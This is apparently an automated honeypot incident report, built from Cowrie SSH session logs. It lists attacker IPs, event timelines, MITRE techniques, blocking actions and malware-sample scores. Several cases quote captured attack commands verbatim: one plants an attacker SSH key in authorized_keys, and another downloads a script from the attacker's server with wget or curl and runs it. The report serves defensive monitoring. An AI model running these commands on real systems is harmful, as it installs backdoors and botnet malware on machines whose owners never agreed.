### 🔴 HIGH · IR-f01d33a53def

| Field | Detail |
|---|---|
| **Source IP** | `172.56.105[.]143` |
| **First Seen** | 2026-11-20 00:49 |
| **Last Seen** | 2026-11-20 00:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:49:49` | `cowrie.session.connect` |
| `2026-11-20 00:49:49` | `cowrie.client.version` |
| `2026-11-20 00:49:49` | `cowrie.client.kex` |
| `2026-11-20 00:49:49` | `cowrie.login.success` |
| `2026-11-20 00:49:50` | `cowrie.session.params` |
| `2026-11-20 00:49:50` | `cowrie.command.input` |
| `2026-11-20 00:49:50` | `cowrie.command.failed` |
| `2026-11-20 00:49:50` | `cowrie.log.closed` |
| `2026-11-20 00:49:51` | `cowrie.session.params` |
| `2026-11-20 00:49:51` | `cowrie.command.input` |
| `2026-11-20 00:49:51` | `cowrie.session.file_download` |
| `2026-11-20 00:49:51` | `cowrie.log.closed` |
| `2026-11-20 00:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.56.105[.]143` to AbuseIPDB if not already reported
- [ ] Block `172.56.105[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c75dff3d3936

| Field | Detail |
|---|---|
| **Source IP** | `172.56.105[.]143` |
| **First Seen** | 2026-11-20 00:49 |
| **Last Seen** | 2026-11-20 00:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:49:51` | `cowrie.session.connect` |
| `2026-11-20 00:49:51` | `cowrie.client.version` |
| `2026-11-20 00:49:51` | `cowrie.client.kex` |
| `2026-11-20 00:49:52` | `cowrie.login.success` |
| `2026-11-20 00:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.56.105[.]143` to AbuseIPDB if not already reported
- [ ] Block `172.56.105[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8089ccc2c9b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-20 00:54 |
| **Last Seen** | 2026-11-20 00:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:54:54` | `cowrie.session.connect` |
| `2026-11-20 00:54:54` | `cowrie.client.version` |
| `2026-11-20 00:54:54` | `cowrie.client.kex` |
| `2026-11-20 00:54:54` | `cowrie.login.success` |
| `2026-11-20 00:54:54` | `cowrie.direct-tcpip.request` |
| `2026-11-20 00:54:54` | `cowrie.direct-tcpip.data` |
| `2026-11-20 00:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2414b855c82

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-11-20 01:04 |
| **Last Seen** | 2026-11-20 01:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, linuxshell, system, sh, ls /home; /bin/busybox BOTNET` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 01:04:02` | `cowrie.session.connect` |
| `2026-11-20 01:04:02` | `cowrie.login.success` |
| `2026-11-20 01:04:03` | `cowrie.session.params` |
| `2026-11-20 01:04:03` | `cowrie.command.input` |
| `2026-11-20 01:04:03` | `cowrie.command.failed` |
| `2026-11-20 01:04:03` | `cowrie.command.input` |
| `2026-11-20 01:04:03` | `cowrie.command.failed` |
| `2026-11-20 01:04:03` | `cowrie.command.input` |
| `2026-11-20 01:04:03` | `cowrie.command.failed` |
| `2026-11-20 01:04:03` | `cowrie.command.input` |
| `2026-11-20 01:04:03` | `cowrie.command.input` |
| `2026-11-20 01:04:04` | `cowrie.command.input` |
| `2026-11-20 01:04:04` | `cowrie.session.file_download` |
| `2026-11-20 01:04:04` | `cowrie.session.file_download` |
| `2026-11-20 01:04:05` | `cowrie.session.file_download` |
| … | _3 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a66876d37535

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-11-20 01:04 |
| **Last Seen** | 2026-11-20 01:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 01:04:04` | `cowrie.session.connect` |
| `2026-11-20 01:04:04` | `cowrie.login.success` |
| `2026-11-20 01:04:04` | `cowrie.session.params` |
| `2026-11-20 01:04:05` | `cowrie.command.input` |
| `2026-11-20 01:04:05` | `cowrie.session.file_download` |
| `2026-11-20 01:04:05` | `cowrie.session.file_download` |
| `2026-11-20 01:04:05` | `cowrie.session.file_download` |
| `2026-11-20 01:04:05` | `cowrie.session.file_download.failed` |
| `2026-11-20 01:04:08` | `cowrie.log.closed` |
| `2026-11-20 01:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0533c7be358d

| Field | Detail |
|---|---|
| **Source IP** | `150.5.146[.]193` |
| **First Seen** | 2026-11-20 01:11 |
| **Last Seen** | 2026-11-20 01:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 01:11:43` | `cowrie.session.connect` |
| `2026-11-20 01:11:43` | `cowrie.client.version` |
| `2026-11-20 01:11:43` | `cowrie.client.kex` |
| `2026-11-20 01:11:44` | `cowrie.login.success` |
| `2026-11-20 01:11:45` | `cowrie.session.params` |
| `2026-11-20 01:11:45` | `cowrie.command.input` |
| `2026-11-20 01:11:45` | `cowrie.command.failed` |
| `2026-11-20 01:11:45` | `cowrie.log.closed` |
| `2026-11-20 01:11:46` | `cowrie.session.params` |
| `2026-11-20 01:11:46` | `cowrie.command.input` |
| `2026-11-20 01:11:46` | `cowrie.session.file_download` |
| `2026-11-20 01:11:46` | `cowrie.log.closed` |
| `2026-11-20 01:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.146[.]193` to AbuseIPDB if not already reported
- [ ] Block `150.5.146[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33fb04f77818

| Field | Detail |
|---|---|
| **Source IP** | `150.5.146[.]193` |
| **First Seen** | 2026-11-20 01:11 |
| **Last Seen** | 2026-11-20 01:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 01:11:46` | `cowrie.session.connect` |
| `2026-11-20 01:11:46` | `cowrie.client.version` |
| `2026-11-20 01:11:47` | `cowrie.client.kex` |
| `2026-11-20 01:11:48` | `cowrie.login.success` |
| `2026-11-20 01:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.146[.]193` to AbuseIPDB if not already reported
- [ ] Block `150.5.146[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68cc4989243f

| Field | Detail |
|---|---|
| **Source IP** | `43.129.44[.]66` |
| **First Seen** | 2026-11-20 01:12 |
| **Last Seen** | 2026-11-20 01:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 01:12:34` | `cowrie.session.connect` |
| `2026-11-20 01:12:34` | `cowrie.client.version` |
| `2026-11-20 01:12:34` | `cowrie.client.kex` |
| `2026-11-20 01:12:35` | `cowrie.login.success` |
| `2026-11-20 01:12:36` | `cowrie.session.params` |
| `2026-11-20 01:12:36` | `cowrie.command.input` |
| `2026-11-20 01:12:36` | `cowrie.command.failed` |
| `2026-11-20 01:12:36` | `cowrie.log.closed` |
| `2026-11-20 01:12:37` | `cowrie.session.params` |
| `2026-11-20 01:12:37` | `cowrie.command.input` |
| `2026-11-20 01:12:38` | `cowrie.session.file_download` |
| `2026-11-20 01:12:38` | `cowrie.log.closed` |
| `2026-11-20 01:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.129.44[.]66` to AbuseIPDB if not already reported
- [ ] Block `43.129.44[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b29e9fa8f453

| Field | Detail |
|---|---|
| **Source IP** | `43.129.44[.]66` |
| **First Seen** | 2026-11-20 01:12 |
| **Last Seen** | 2026-11-20 01:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 01:12:38` | `cowrie.session.connect` |
| `2026-11-20 01:12:38` | `cowrie.client.version` |
| `2026-11-20 01:12:38` | `cowrie.client.kex` |
| `2026-11-20 01:12:39` | `cowrie.login.success` |
| `2026-11-20 01:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.129.44[.]66` to AbuseIPDB if not already reported
- [ ] Block `43.129.44[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bb67e89f460

| Field | Detail |
|---|---|
| **Source IP** | `78.128.112[.]74` |
| **First Seen** | 2026-11-20 01:20 |
| **Last Seen** | 2026-11-20 01:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'SSH check'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 01:20:06` | `cowrie.session.connect` |
| `2026-11-20 01:20:06` | `cowrie.client.version` |
| `2026-11-20 01:20:06` | `cowrie.client.kex` |
| `2026-11-20 01:20:07` | `cowrie.login.success` |
| `2026-11-20 01:20:08` | `cowrie.session.params` |
| `2026-11-20 01:20:08` | `cowrie.command.input` |
| `2026-11-20 01:20:08` | `cowrie.log.closed` |
| `2026-11-20 01:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.128.112[.]74` to AbuseIPDB if not already reported
- [ ] Block `78.128.112[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0122294594c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]78` |
| **First Seen** | 2026-11-20 01:24 |
| **Last Seen** | 2026-11-20 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 01:24:56` | `cowrie.session.connect` |
| `2026-11-20 01:24:57` | `cowrie.login.success` |
| `2026-11-20 01:24:58` | `cowrie.session.params` |
| `2026-11-20 01:24:58` | `cowrie.log.closed` |
| `2026-11-20 01:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (13) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-27135e4b2797 | HIGH | `1.235.192[.]214` | 2026-11-20 01:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-530a672113ab | HIGH | `1.235.192[.]214` | 2026-11-20 01:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-20d2eb95065f | HIGH | `80.94.95[.]118` | 2026-11-20 01:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e446848e5657 | HIGH | `77.90.185[.]29` | 2026-11-20 01:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-60db23e4f562 | HIGH | `138.226.239[.]233` | 2026-11-20 01:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2cc1f403b84b | HIGH | `138.226.239[.]234` | 2026-11-20 01:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e0266e529b77 | HIGH | `45.148.10[.]61` | 2026-11-20 02:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-4d9c3ca57d59 | HIGH | `193.32.162[.]15` | 2026-11-20 02:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b2d71761b79f | HIGH | `77.239.124[.]252` | 2026-11-20 02:03 | Y | 0 | 0 | `T1078` |
| IR-81f5388def65 | HIGH | `195.178.110[.]78` | 2026-11-20 02:08 | Y | 0 | 0 | `T1078` |
| IR-58b2378d2679 | HIGH | `36.108.175[.]145` | 2026-11-20 02:24 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-2c10ca5aee00 | HIGH | `109.160.32[.]161` | 2026-11-20 02:24 | Y | 1 | 0 | `T1078 · T1592` |
| IR-31ff8c4737ca | HIGH | `109.160.32[.]161` | 2026-11-20 02:54 | Y | 0 | 0 | `T1078 · T1592` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `195.178.110[.]78` | **2** | 2026-11-20 01:24 | 2026-11-20 02:08 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `77.239.124[.]252` | **2** | 2026-11-20 00:20 | 2026-11-20 02:03 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `109.160.32[.]161` | 1 | 2026-11-20 02:23 | 2026-11-20 02:24 | 8s | 0 | `T1592` | 🟢 LOW |
| `14.46.100[.]121` | 1 | 2026-11-20 01:48 | 2026-11-20 01:49 | 31s | 0 | `T1592` | 🟢 LOW |
| `153.246.198[.]45` | 1 | 2026-11-20 00:29 | 2026-11-20 00:29 | 30s | 0 | `T1592` | 🟢 LOW |
| `169.128.70[.]53` | 1 | 2026-11-20 00:36 | 2026-11-20 00:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.44.148[.]243` | 1 | 2026-11-20 02:22 | 2026-11-20 02:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-20 02:02 | 2026-11-20 02:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.96.138[.]57` | 1 | 2026-11-20 00:12 | 2026-11-20 00:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `197.231.197[.]2` | 1 | 2026-11-20 00:28 | 2026-11-20 00:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]209` | 1 | 2026-11-20 01:28 | 2026-11-20 01:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `221.229.218[.]50` | 1 | 2026-11-20 00:13 | 2026-11-20 00:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `3.94.79[.]52` | 1 | 2026-11-20 01:28 | 2026-11-20 01:28 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-11-20 01:59 | 2026-11-20 01:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.32.92[.]140` | 1 | 2026-11-20 02:16 | 2026-11-20 02:17 | 20s | 0 | `T1592` | 🟢 LOW |
| `62.108.201[.]221` | 1 | 2026-11-20 01:40 | 2026-11-20 01:41 | 29s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-11-20 01:06 | 2026-11-20 01:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-20 01:20 | 2026-11-20 01:20 | 6s | 0 | `T1592` | 🟢 LOW |
| `83.233.22[.]225` | 1 | 2026-11-20 00:58 | 2026-11-20 00:58 | 29s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]61` | 1 | 2026-11-20 02:06 | 2026-11-20 02:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]65` | 1 | 2026-11-20 00:56 | 2026-11-20 00:56 | 2s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
